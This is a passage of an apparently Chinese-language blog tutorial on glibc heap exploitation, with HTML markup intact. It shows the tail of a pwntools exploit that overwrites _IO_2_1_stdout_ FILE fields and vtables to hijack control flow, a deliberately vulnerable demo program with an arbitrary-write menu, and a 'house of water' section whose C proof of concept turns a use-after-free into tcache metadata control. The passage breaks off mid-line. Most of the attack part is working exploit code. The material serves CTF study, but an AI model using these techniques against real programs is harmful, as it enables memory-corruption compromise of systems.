class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps_maybe_mmap = libc.address + <span class="number">0x215f40</span></span><br><span class="line">log.success(<span class="string">f&quot;_IO_wfile_jumps_maybe_mmap: <span class="subst">&#123;_IO_wfile_jumps_maybe_mmap:#&#125;</span>&quot;</span>)</span><br><span class="line">_IO_str_jumps = libc.address + <span class="number">0x2166c0</span></span><br><span class="line">log.success(<span class="string">f&quot;_IO_str_jumps: <span class="subst">&#123;_IO_str_jumps:#&#125;</span>&quot;</span>)</span><br><span class="line">_IO_default_xsputn = _IO_str_jumps + <span class="number">0x38</span></span><br><span class="line">_IO_default_xsgetn = _IO_str_jumps + <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处直接修改_IO_2_1_stdout_内容</span></span><br><span class="line">write(libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="number">0xe0</span>, flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span>, <span class="comment"># disable lock</span></span><br><span class="line">    <span class="number">0x38</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x100</span>, <span class="comment"># +0xe0可写即可</span></span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>), <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xd8</span>: _IO_wfile_jumps_maybe_mmap - <span class="number">0x18</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝栈上数据到可控地址，这里拷贝到_IO_2_1_stdout_的上方，方便下次写入顺便完成fp第三次控制</span></span><br><span class="line">io.send(flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># 需要可写地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="number">0x38</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">    <span class="number">0x40</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">    <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="number">0xd8</span>: _IO_default_xsputn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0x28</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    <span class="number">0x30</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>], <span class="comment"># _IO_write_end</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后这里就可以劫持执行流到0xdeadbeaf了</span></span><br><span class="line">io.send(flat(&#123;</span><br><span class="line">    <span class="number">0</span>: <span class="number">0xdeadbeaf</span>, <span class="comment"># retn</span></span><br><span class="line">    <span class="number">0x1c8</span>-<span class="number">0xc8</span>: &#123;</span><br><span class="line">        <span class="number">0x38</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span> + <span class="number">0xc8</span>, <span class="comment"># _IO_buf_base</span></span><br><span class="line">        <span class="number">0x40</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0x1c8</span>, <span class="comment"># _IO_buf_end</span></span><br><span class="line">        <span class="number">0xa0</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + <span class="number">0xe0</span>,   </span><br><span class="line">        <span class="number">0xc0</span>: p32(<span class="number">0xffffffff</span>),</span><br><span class="line"></span><br><span class="line">        <span class="number">0xd8</span>: _IO_default_xsgetn - <span class="number">0x90</span>, <span class="comment"># vtable</span></span><br><span class="line">        <span class="number">0x08</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] - <span class="number">0x1c8</span>, <span class="comment"># _IO_read_ptr</span></span><br><span class="line">        <span class="number">0x10</span>: libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>] + (<span class="number">0x1c8</span> - <span class="number">0xc8</span>), <span class="comment"># _IO_read_end</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0xe0</span>: &#123;</span><br><span class="line">            <span class="number">0xe0</span>: _IO_wfile_jumps_maybe_mmap</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>demo程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc demo.c -o demo</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] printf: %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(</span><br><span class="line">            <span class="string">&quot;1. add heap.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;2. write libc.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;3. exit&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;c);</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> size;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;size&gt; &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">            <span class="type">char</span> *p = <span class="built_in">malloc</span>(size);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] done %p\n&quot;</span>, p);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;content&gt; &quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>, p, size);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="type">size_t</span> addr, size;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;size&gt; &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;size);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;addr&gt; &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;content&gt; &quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>, (<span class="type">char</span>*)addr, size);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-water"><a href="#house-of-water" class="headerlink" title="house of water"></a>house of water</h1><h2 id="概要-24"><a href="#概要-24" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong></p>
<p><strong>利用条件:</strong></p>
<ul>
<li><p>可以写一个被释放的chunk</p>
</li>
<li><p>程序可以申请适当大小的堆块</p>
</li>
</ul>
<p><strong>利用效果:</strong>能够在 tcache 的链表上留下 libc 的相关地址，并将其申请出来</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-24"><a href="#原理-24" class="headerlink" title="原理"></a>原理</h2><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache </span></span><br><span class="line"><span class="comment"> * metadata control primitive, with the added benefit of obtaining a free libc pointer in the </span></span><br><span class="line"><span class="comment"> * t-cache metadata as well.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will</span></span><br><span class="line"><span class="comment"> * contain 4 bits of randomness. If you can increment integers, no brutefore is required.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * By setting the count of t-cache entries 0x3e0 and 0x3f0 to 1, a &quot;fake&quot; heap chunk header of </span></span><br><span class="line"><span class="comment"> * size &quot;0x10001&quot; is created.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked </span></span><br><span class="line"><span class="comment"> * address entries, enabling the creation of a fully functional fake unsorted-bin entry.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * The correct size should be set for the chunk, and the next chunk&#x27;s prev-in-use bit </span></span><br><span class="line"><span class="comment"> * must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values </span></span><br><span class="line"><span class="comment"> * should be written.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control</span></span><br><span class="line"><span class="comment"> * is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer</span></span><br><span class="line"><span class="comment"> * to be ready for allocation as well.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Technique / house by @udp_ctf - Water Paddler / Blue Water </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_memory</span><span class="params">(<span class="type">void</span> *addr, <span class="type">unsigned</span> <span class="type">long</span> count)</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; count*<span class="number">16</span>; i += <span class="number">16</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%016lx\t\t0x%016lx  0x%016lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)(addr+i), *(<span class="type">long</span> *)(addr+i), *(<span class="type">long</span> *)(addr+i+<span class="number">0x8</span>));</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="comment">// Dummy variable</span></span><br><span class="line">	<span class="type">void</span> *_ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Prevent _IO_FILE from buffering in the heap</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 1           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 1: Allocate a 0x3d8 and a 0x3e8 to set their respective t-cache counts to 1, </span></span><br><span class="line">	<span class="comment">// effectively inserting 0x10001 in to the t-cache above the 0x20 and 0x30 t-cache</span></span><br><span class="line">	<span class="comment">// addresses.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate and free a chunk in 0x3e0 and 0x3f0 t-caches. This sets both&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;their t-cache entry counts to 1 and creates a fake 0x10001 header:&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line">	<span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t- chunks:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* Entry 0x3e0 @ %p\n&quot;</span>, fake_size_lsb);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* Entry 0x3f0 @ %p\n&quot;</span>, fake_size_msb);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_msb);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// This is just to make a pointer to the t-cache metadata for later.</span></span><br><span class="line">	<span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The t-cache metadata will now have the following entry counts:&quot;</span>);</span><br><span class="line">	dump_memory(metadata+<span class="number">0x70</span>, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Make allocations to free later such that we can exhaust the 0x90 t-cache</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate 7 0x88 chunks needed to fill out the 0x90 t-cache at a later time&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 2           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 2: Create the unsorted bins linked list, used for hijacking at a later time</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now, allocate three 0x90 chunks with guard chunks in between. This prevents&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;chunk-consolidation and sets our target for the house of water attack.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t- chunks:&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* unsorted_start\t@ %p\n&quot;</span>, unsorted_start);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t\t* /guard/&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* unsorted_middle\t@ %p\n&quot;</span>, unsorted_middle);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t\t* /guard/&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* unsorted_end\t\t@ %p\n&quot;</span>, unsorted_end);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t\t* /guard/&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t|           STEP 3           |&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t==============================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Step 3: Satisfy the conditions for a free&#x27;d chunk, namely having the correct size at the end of the chunk and</span></span><br><span class="line">	<span class="comment">// a size field next to it having it&#x27;s prev-in-use bit set to 0	</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Make an allocation to reach the end of the faked chunk&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);		  <span class="comment">// Padding</span></span><br><span class="line">	<span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\t- chunks:&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t\t* padding\t\t@ %p\n&quot;</span>, _);</span><br><span class="line">	<span class="built_in">printf</span>(<span 